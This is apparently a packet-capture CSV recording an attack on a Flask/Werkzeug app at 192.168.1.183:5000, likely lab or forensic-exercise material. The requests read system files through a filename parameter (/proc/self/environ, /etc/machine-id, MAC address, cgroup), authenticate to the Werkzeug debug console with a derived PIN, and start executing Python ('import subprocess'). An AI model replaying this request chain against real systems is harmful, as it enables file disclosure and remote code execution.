"1405","2023-10-21 13:48:27.491355873","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=42169 Win=37248 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1406","2023-10-21 13:48:27.491409295","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=45065 Win=35200 Len=0 TSval=2341543565 TSecr=1741523775","VMware_65:77:ad"
"1408","2023-10-21 13:48:27.491786623","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [ACK] Seq=512 Ack=66629 Win=25472 Len=0 TSval=2341543566 TSecr=1741523775","VMware_65:77:ad"
"1409","2023-10-21 13:48:27.494231797","192.168.1.227","192.168.1.183","TCP","66","51956  >  5000 [FIN, ACK] Seq=512 Ack=66629 Win=64128 Len=0 TSval=2341543568 TSecr=1741523775","VMware_65:77:ad"
"1527","2023-10-21 13:48:32.300689853","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=881 Ack=881 Win=501 Len=110 TSval=2919199069 TSecr=1841285666 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1529","2023-10-21 13:48:32.303407358","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=991 Ack=991 Win=501 Len=0 TSval=2919199072 TSecr=1841290670","VMware_65:77:ad"
"1547","2023-10-21 13:48:33.826109131","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1560","2023-10-21 13:48:34.829211471","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1589","2023-10-21 13:48:35.829393017","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1604","2023-10-21 13:48:36.839215669","192.168.1.227","239.255.255.250","SSDP","210","M-SEARCH * HTTP/1.1 ","VMware_65:77:ad"
"1615","2023-10-21 13:48:37.310499394","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=991 Ack=991 Win=501 Len=110 TSval=2919204078 TSecr=1841290670 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1617","2023-10-21 13:48:37.312387300","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1101 Ack=1101 Win=501 Len=0 TSval=2919204081 TSecr=1841295679","VMware_65:77:ad"
"1638","2023-10-21 13:48:38.089777873","192.168.1.227","142.251.10.94","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1639","2023-10-21 13:48:38.089976484","192.168.1.227","192.229.179.87","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1640","2023-10-21 13:48:38.090619675","192.168.1.227","142.251.10.94","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1641","2023-10-21 13:48:38.090766650","192.168.1.227","142.251.10.94","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1647","2023-10-21 13:48:38.093586598","192.168.1.227","74.125.200.95","TLSv1.3","121","Application Data","VMware_65:77:ad"
"1649","2023-10-21 13:48:38.093649208","192.168.1.227","142.251.10.94","TCP","66","49592  >  443 [ACK] Seq=2007 Ack=19495 Win=64128 Len=0 TSval=831673946 TSecr=4285568148","VMware_65:77:ad"
"1650","2023-10-21 13:48:38.093955357","192.168.1.227","74.125.200.95","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1651","2023-10-21 13:48:38.094062282","192.168.1.227","74.125.200.95","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1652","2023-10-21 13:48:38.094557070","192.168.1.227","192.229.179.87","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1653","2023-10-21 13:48:38.094879584","192.168.1.227","192.229.179.87","TLSv1.3","106","Application Data","VMware_65:77:ad"
"1654","2023-10-21 13:48:38.095208634","192.168.1.227","192.229.179.87","TCP","66","36704  >  443 [FIN, ACK] Seq=1792 Ack=10309 Win=64128 Len=0 TSval=3909231585 TSecr=1197406931","VMware_65:77:ad"
"1658","2023-10-21 13:48:38.097229906","192.168.1.227","74.125.200.95","TCP","66","53016  >  443 [ACK] Seq=1946 Ack=2364 Win=64128 Len=0 TSval=2027215923 TSecr=3154230308","VMware_65:77:ad"
"1752","2023-10-21 13:48:42.318702869","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1101 Ack=1101 Win=501 Len=110 TSval=2919209087 TSecr=1841295679 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1754","2023-10-21 13:48:42.322711256","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1211 Ack=1211 Win=501 Len=0 TSval=2919209091 TSecr=1841300688","VMware_65:77:ad"
"1875","2023-10-21 13:48:46.947330539","192.168.1.227","192.168.1.183","TCP","74","52082  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341563020 TSecr=0 WS=128","VMware_65:77:ad"
"1877","2023-10-21 13:48:46.947968731","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341563021 TSecr=1741543232","VMware_65:77:ad"
"1878","2023-10-21 13:48:46.948404986","192.168.1.227","192.168.1.183","HTTP","530","GET /api?filename=/proc/self/environ HTTP/1.1 ","VMware_65:77:ad"
"1882","2023-10-21 13:48:46.950710816","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=176 Win=64128 Len=0 TSval=2341563024 TSecr=1741543234","VMware_65:77:ad"
"1885","2023-10-21 13:48:46.950858529","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=3072 Win=63488 Len=0 TSval=2341563024 TSecr=1741543235","VMware_65:77:ad"
"1886","2023-10-21 13:48:46.950858599","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [ACK] Seq=465 Ack=3621 Win=62976 Len=0 TSval=2341563024 TSecr=1741543235","VMware_65:77:ad"
"1887","2023-10-21 13:48:46.951448898","192.168.1.227","192.168.1.183","TCP","66","52082  >  5000 [FIN, ACK] Seq=465 Ack=3622 Win=64128 Len=0 TSval=2341563025 TSecr=1741543235","VMware_65:77:ad"
"1909","2023-10-21 13:48:47.325221798","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1211 Ack=1211 Win=501 Len=110 TSval=2919214093 TSecr=1841300688 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"1911","2023-10-21 13:48:47.339633196","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1321 Ack=1321 Win=501 Len=0 TSval=2919214108 TSecr=1841305705","VMware_65:77:ad"
"1968","2023-10-21 13:48:50.281099679","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"2032","2023-10-21 13:48:52.341809691","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1321 Ack=1321 Win=501 Len=110 TSval=2919219110 TSecr=1841305705 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2034","2023-10-21 13:48:52.359745880","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1431 Ack=1431 Win=501 Len=0 TSval=2919219128 TSecr=1841310726","VMware_65:77:ad"
"2125","2023-10-21 13:48:56.758113327","192.168.1.227","192.168.1.183","TCP","74","45034  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341572831 TSecr=0 WS=128","VMware_65:77:ad"
"2127","2023-10-21 13:48:56.758585625","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341572832 TSecr=1741553043","VMware_65:77:ad"
"2128","2023-10-21 13:48:56.758909301","192.168.1.227","192.168.1.183","HTTP","502","GET /api HTTP/1.1 ","VMware_65:77:ad"
"2132","2023-10-21 13:48:56.800741889","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=196 Win=64128 Len=0 TSval=2341572874 TSecr=1741553084","VMware_65:77:ad"
"2134","2023-10-21 13:48:56.800996262","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=7436 Win=60672 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2136","2023-10-21 13:48:56.801126131","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=13228 Win=61568 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2137","2023-10-21 13:48:56.801203549","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [ACK] Seq=437 Ack=16683 Win=58624 Len=0 TSval=2341572874 TSecr=1741553085","VMware_65:77:ad"
"2139","2023-10-21 13:48:56.802900261","192.168.1.227","192.168.1.183","TCP","66","45034  >  5000 [FIN, ACK] Seq=437 Ack=16684 Win=64128 Len=0 TSval=2341572876 TSecr=1741553086","VMware_65:77:ad"
"2143","2023-10-21 13:48:57.366841035","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1431 Ack=1431 Win=501 Len=110 TSval=2919224135 TSecr=1841310726 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2145","2023-10-21 13:48:57.385174325","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1541 Ack=1541 Win=501 Len=0 TSval=2919224153 TSecr=1841315750","VMware_65:77:ad"
"2663","2023-10-21 13:49:02.390333082","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1541 Ack=1541 Win=501 Len=110 TSval=2919229158 TSecr=1841315750 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2665","2023-10-21 13:49:02.396135151","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1651 Ack=1651 Win=501 Len=0 TSval=2919229164 TSecr=1841320762","VMware_65:77:ad"
"2771","2023-10-21 13:49:07.398965538","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1651 Ack=1651 Win=501 Len=110 TSval=2919234167 TSecr=1841320762 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2773","2023-10-21 13:49:07.410973947","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1761 Ack=1761 Win=501 Len=0 TSval=2919234179 TSecr=1841325776","VMware_65:77:ad"
"2802","2023-10-21 13:49:08.632064005","192.168.1.227","192.168.1.183","TCP","74","59330  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341584705 TSecr=0 WS=128","VMware_65:77:ad"
"2804","2023-10-21 13:49:08.632791749","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341584706 TSecr=1741564917","VMware_65:77:ad"
"2805","2023-10-21 13:49:08.632974088","192.168.1.227","192.168.1.183","HTTP","525","GET /api?filename=/proc/net/arp HTTP/1.1 ","VMware_65:77:ad"
"2809","2023-10-21 13:49:08.635048071","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [ACK] Seq=460 Ack=175 Win=64128 Len=0 TSval=2341584708 TSecr=1741564919","VMware_65:77:ad"
"2810","2023-10-21 13:49:08.635718503","192.168.1.227","192.168.1.183","TCP","66","59330  >  5000 [FIN, ACK] Seq=460 Ack=399 Win=64128 Len=0 TSval=2341584709 TSecr=1741564919","VMware_65:77:ad"
"2884","2023-10-21 13:49:12.414484220","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1761 Ack=1761 Win=501 Len=110 TSval=2919239183 TSecr=1841325776 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2886","2023-10-21 13:49:12.430167681","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1871 Ack=1871 Win=501 Len=0 TSval=2919239198 TSecr=1841330796","VMware_65:77:ad"
"2980","2023-10-21 13:49:17.438000256","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1871 Ack=1871 Win=501 Len=110 TSval=2919244206 TSecr=1841330796 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"2984","2023-10-21 13:49:17.447518843","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=1981 Ack=1981 Win=501 Len=0 TSval=2919244216 TSecr=1841335813","VMware_65:77:ad"
"2994","2023-10-21 13:49:18.455918121","192.168.1.227","192.168.1.183","TCP","74","57994  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341594529 TSecr=0 WS=128","VMware_65:77:ad"
"2996","2023-10-21 13:49:18.456348636","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341594530 TSecr=1741574740","VMware_65:77:ad"
"2997","2023-10-21 13:49:18.456557035","192.168.1.227","192.168.1.183","HTTP","539","GET /api?filename=/sys/class/net/eth0/address HTTP/1.1 ","VMware_65:77:ad"
"3001","2023-10-21 13:49:18.458917348","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [ACK] Seq=474 Ack=174 Win=64128 Len=0 TSval=2341594532 TSecr=1741574743","VMware_65:77:ad"
"3002","2023-10-21 13:49:18.459246133","192.168.1.227","192.168.1.183","TCP","66","57994  >  5000 [FIN, ACK] Seq=474 Ack=260 Win=64128 Len=0 TSval=2341594532 TSecr=1741574743","VMware_65:77:ad"
"3072","2023-10-21 13:49:22.454019987","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=1981 Ack=1981 Win=501 Len=110 TSval=2919249222 TSecr=1841335813 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3075","2023-10-21 13:49:22.464477576","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2091 Ack=2091 Win=501 Len=0 TSval=2919249233 TSecr=1841340830","VMware_65:77:ad"
"3076","2023-10-21 13:49:22.475188293","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"3388","2023-10-21 13:49:27.470807887","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2091 Ack=2091 Win=501 Len=110 TSval=2919254238 TSecr=1841340830 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3393","2023-10-21 13:49:27.486158073","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2201 Ack=2201 Win=501 Len=0 TSval=2919254254 TSecr=1841345847","VMware_65:77:ad"
"3457","2023-10-21 13:49:30.650218165","192.168.1.227","192.168.1.183","TCP","74","46042  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341606723 TSecr=0 WS=128","VMware_65:77:ad"
"3459","2023-10-21 13:49:30.650817984","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341606724 TSecr=1741586935","VMware_65:77:ad"
"3460","2023-10-21 13:49:30.651053765","192.168.1.227","192.168.1.183","HTTP","527","GET /api?filename=/etc/machine-id HTTP/1.1 ","VMware_65:77:ad"
"3463","2023-10-21 13:49:30.652846789","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=462 Ack=175 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3466","2023-10-21 13:49:30.653035941","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [ACK] Seq=462 Ack=275 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3467","2023-10-21 13:49:30.653643044","192.168.1.227","192.168.1.183","TCP","66","46042  >  5000 [FIN, ACK] Seq=462 Ack=276 Win=64128 Len=0 TSval=2341606726 TSecr=1741586937","VMware_65:77:ad"
"3512","2023-10-21 13:49:32.495577156","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2201 Ack=2201 Win=501 Len=110 TSval=2919259263 TSecr=1841345847 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3515","2023-10-21 13:49:32.501283198","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2311 Ack=2311 Win=501 Len=0 TSval=2919259269 TSecr=1841350866","VMware_65:77:ad"
"3595","2023-10-21 13:49:37.510114545","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2311 Ack=2311 Win=501 Len=110 TSval=2919264278 TSecr=1841350866 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3598","2023-10-21 13:49:37.521373225","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2421 Ack=2421 Win=501 Len=0 TSval=2919264289 TSecr=1841355886","VMware_65:77:ad"
"3645","2023-10-21 13:49:40.667843020","192.168.1.227","192.168.1.183","TCP","74","43138  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341616740 TSecr=0 WS=128","VMware_65:77:ad"
"3647","2023-10-21 13:49:40.668517021","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341616741 TSecr=1741596952","VMware_65:77:ad"
"3648","2023-10-21 13:49:40.668751911","192.168.1.227","192.168.1.183","HTTP","529","GET /api?filename=/proc/self/cgroup HTTP/1.1 ","VMware_65:77:ad"
"3652","2023-10-21 13:49:40.671251535","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [ACK] Seq=464 Ack=175 Win=64128 Len=0 TSval=2341616744 TSecr=1741596955","VMware_65:77:ad"
"3653","2023-10-21 13:49:40.671682671","192.168.1.227","192.168.1.183","TCP","66","43138  >  5000 [FIN, ACK] Seq=464 Ack=290 Win=64128 Len=0 TSval=2341616744 TSecr=1741596955","VMware_65:77:ad"
"3711","2023-10-21 13:49:42.525862947","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2421 Ack=2421 Win=501 Len=110 TSval=2919269293 TSecr=1841355886 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3714","2023-10-21 13:49:42.535635375","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2531 Ack=2531 Win=501 Len=0 TSval=2919269303 TSecr=1841360900","VMware_65:77:ad"
"3807","2023-10-21 13:49:47.542305171","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2531 Ack=2531 Win=501 Len=110 TSval=2919274310 TSecr=1841360900 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3810","2023-10-21 13:49:47.553672185","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2641 Ack=2641 Win=501 Len=0 TSval=2919274321 TSecr=1841365918","VMware_65:77:ad"
"3835","2023-10-21 13:49:49.365015358","192.168.1.227","192.168.1.183","TCP","74","37082  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341625436 TSecr=0 WS=128","VMware_65:77:ad"
"3837","2023-10-21 13:49:49.365616536","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341625438 TSecr=1741605649","VMware_65:77:ad"
"3838","2023-10-21 13:49:49.366027554","192.168.1.227","192.168.1.183","HTTP","558","GET /console HTTP/1.1 ","VMware_65:77:ad"
"3842","2023-10-21 13:49:49.368970874","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=176 Win=64128 Len=0 TSval=2341625441 TSecr=1741605653","VMware_65:77:ad"
"3843","2023-10-21 13:49:49.369031600","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=1624 Win=64128 Len=0 TSval=2341625442 TSecr=1741605653","VMware_65:77:ad"
"3846","2023-10-21 13:49:49.369274104","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [ACK] Seq=493 Ack=1739 Win=64128 Len=0 TSval=2341625442 TSecr=1741605653","VMware_65:77:ad"
"3847","2023-10-21 13:49:49.370202923","192.168.1.227","192.168.1.183","TCP","66","37082  >  5000 [FIN, ACK] Seq=493 Ack=1740 Win=64128 Len=0 TSval=2341625443 TSecr=1741605653","VMware_65:77:ad"
"3850","2023-10-21 13:49:50.147685285","192.168.1.227","192.168.1.183","TCP","74","37086  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626220 TSecr=0 WS=128","VMware_65:77:ad"
"3852","2023-10-21 13:49:50.148068339","192.168.1.227","192.168.1.183","TCP","74","37088  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626220 TSecr=0 WS=128","VMware_65:77:ad"
"3854","2023-10-21 13:49:50.148468846","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626221 TSecr=1741606432","VMware_65:77:ad"
"3855","2023-10-21 13:49:50.148468936","192.168.1.227","192.168.1.183","HTTP","497","GET /console?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1 ","VMware_65:77:ad"
"3857","2023-10-21 13:49:50.148468966","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626221 TSecr=1741606432","VMware_65:77:ad"
"3858","2023-10-21 13:49:50.148701772","192.168.1.227","192.168.1.183","HTTP","484","GET /console?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1 ","VMware_65:77:ad"
"3861","2023-10-21 13:49:50.153765390","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=432 Ack=305 Win=64128 Len=0 TSval=2341626226 TSecr=1741606437","VMware_65:77:ad"
"3864","2023-10-21 13:49:50.154151941","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=316 Win=64128 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3869","2023-10-21 13:49:50.154651287","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [ACK] Seq=432 Ack=6383 Win=60672 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3870","2023-10-21 13:49:50.154651387","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=7556 Win=60672 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3871","2023-10-21 13:49:50.154712294","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=8508 Win=59776 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3872","2023-10-21 13:49:50.154857712","192.168.1.227","192.168.1.183","TCP","66","37086  >  5000 [FIN, ACK] Seq=432 Ack=6384 Win=64128 Len=0 TSval=2341626227 TSecr=1741606438","VMware_65:77:ad"
"3874","2023-10-21 13:49:50.155135665","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [ACK] Seq=419 Ack=10838 Win=57472 Len=0 TSval=2341626227 TSecr=1741606439","VMware_65:77:ad"
"3875","2023-10-21 13:49:50.156129709","192.168.1.227","192.168.1.183","TCP","66","37088  >  5000 [FIN, ACK] Seq=419 Ack=10838 Win=64128 Len=0 TSval=2341626229 TSecr=1741606439","VMware_65:77:ad"
"3887","2023-10-21 13:49:50.260224055","192.168.1.227","192.168.1.183","TCP","74","37106  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341626332 TSecr=0 WS=128","VMware_65:77:ad"
"3889","2023-10-21 13:49:50.260586239","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341626333 TSecr=1741606544","VMware_65:77:ad"
"3890","2023-10-21 13:49:50.260794458","192.168.1.227","192.168.1.183","HTTP","493","GET /console?__debugger__=yes&cmd=printpin&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"3894","2023-10-21 13:49:50.263342886","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [ACK] Seq=428 Ack=174 Win=64128 Len=0 TSval=2341626336 TSecr=1741606547","VMware_65:77:ad"
"3895","2023-10-21 13:49:50.263904691","192.168.1.227","192.168.1.183","TCP","66","37106  >  5000 [FIN, ACK] Seq=428 Ack=175 Win=64128 Len=0 TSval=2341626336 TSecr=1741606547","VMware_65:77:ad"
"3897","2023-10-21 13:49:50.280808253","192.168.1.227","162.159.200.123","NTP","90","NTP Version 4, client","VMware_65:77:ad"
"3917","2023-10-21 13:49:52.558673537","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2641 Ack=2641 Win=501 Len=110 TSval=2919279326 TSecr=1841365918 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"3920","2023-10-21 13:49:52.568314903","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2751 Ack=2751 Win=501 Len=0 TSval=2919279336 TSecr=1841370933","VMware_65:77:ad"
"3952","2023-10-21 13:49:54.515275893","192.168.1.227","192.168.1.183","TCP","74","37112  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341630587 TSecr=0 WS=128","VMware_65:77:ad"
"3954","2023-10-21 13:49:54.515655700","192.168.1.227","192.168.1.183","TCP","66","37112  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341630588 TSecr=1741610799","VMware_65:77:ad"
"3955","2023-10-21 13:49:54.515998416","192.168.1.227","192.168.1.183","HTTP","493","GET /console?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1 ","VMware_65:77:ad"
"3959","2023-10-21 13:49:54.518081979","192.168.1.227","192.168.1.183","TCP","66","37112  >  5000 [ACK] Seq=428 Ack=293 Win=64128 Len=0 TSval=2341630591 TSecr=1741610802","VMware_65:77:ad"
"3960","2023-10-21 13:49:54.518707367","192.168.1.227","192.168.1.183","TCP","66","37112  >  5000 [FIN, ACK] Seq=428 Ack=801 Win=64128 Len=0 TSval=2341630591 TSecr=1741610802","VMware_65:77:ad"
"4018","2023-10-21 13:49:57.575187457","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2751 Ack=2751 Win=501 Len=110 TSval=2919284343 TSecr=1841370933 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4023","2023-10-21 13:49:57.634560453","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2861 Ack=2861 Win=501 Len=0 TSval=2919284402 TSecr=1841375999","VMware_65:77:ad"
"4301","2023-10-21 13:50:02.639535326","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2861 Ack=2861 Win=501 Len=110 TSval=2919289407 TSecr=1841375999 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4308","2023-10-21 13:50:02.688473673","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=2971 Ack=2971 Win=501 Len=0 TSval=2919289456 TSecr=1841381020","VMware_65:77:ad"
"4460","2023-10-21 13:50:05.838492509","192.168.1.227","192.168.1.183","TCP","74","33196  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341641911 TSecr=0 WS=128","VMware_65:77:ad"
"4462","2023-10-21 13:50:05.838868389","192.168.1.227","192.168.1.183","TCP","66","33196  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341641911 TSecr=1741622123","VMware_65:77:ad"
"4463","2023-10-21 13:50:05.839170618","192.168.1.227","192.168.1.183","HTTP","456","GET /console?__debugger__=yes&cmd=pinauth&pin=880-163-023&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
"4467","2023-10-21 13:50:05.847987418","192.168.1.227","192.168.1.183","TCP","66","33196  >  5000 [ACK] Seq=391 Ack=264 Win=64128 Len=0 TSval=2341641920 TSecr=1741622132","VMware_65:77:ad"
"4468","2023-10-21 13:50:05.850488055","192.168.1.227","192.168.1.183","TCP","66","33196  >  5000 [FIN, ACK] Seq=391 Ack=299 Win=64128 Len=0 TSval=2341641923 TSecr=1741622132","VMware_65:77:ad"
"4506","2023-10-21 13:50:07.694486850","192.168.1.227","192.168.1.1","TCP","176","42434  >  8009 [PSH, ACK] Seq=2971 Ack=2971 Win=501 Len=110 TSval=2919294461 TSecr=1841381020 [TCP segment of a reassembled PDU]","VMware_65:77:ad"
"4509","2023-10-21 13:50:07.699179230","192.168.1.227","192.168.1.1","TCP","66","42434  >  8009 [ACK] Seq=3081 Ack=3081 Win=501 Len=0 TSval=2919294467 TSecr=1841386063","VMware_65:77:ad"
"4574","2023-10-21 13:50:10.332438917","192.168.1.227","192.168.1.183","TCP","74","45900  >  5000 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM=1 TSval=2341646405 TSecr=0 WS=128","VMware_65:77:ad"
"4576","2023-10-21 13:50:10.332720717","192.168.1.227","192.168.1.183","TCP","66","45900  >  5000 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=2341646405 TSecr=1741626617","VMware_65:77:ad"
"4577","2023-10-21 13:50:10.332896313","192.168.1.227","192.168.1.183","HTTP","518","GET /console?&__debugger__=yes&cmd=import%20subprocess&frm=0&s=CvokZoT2hAwJh0pLGKhC HTTP/1.1 ","VMware_65:77:ad"
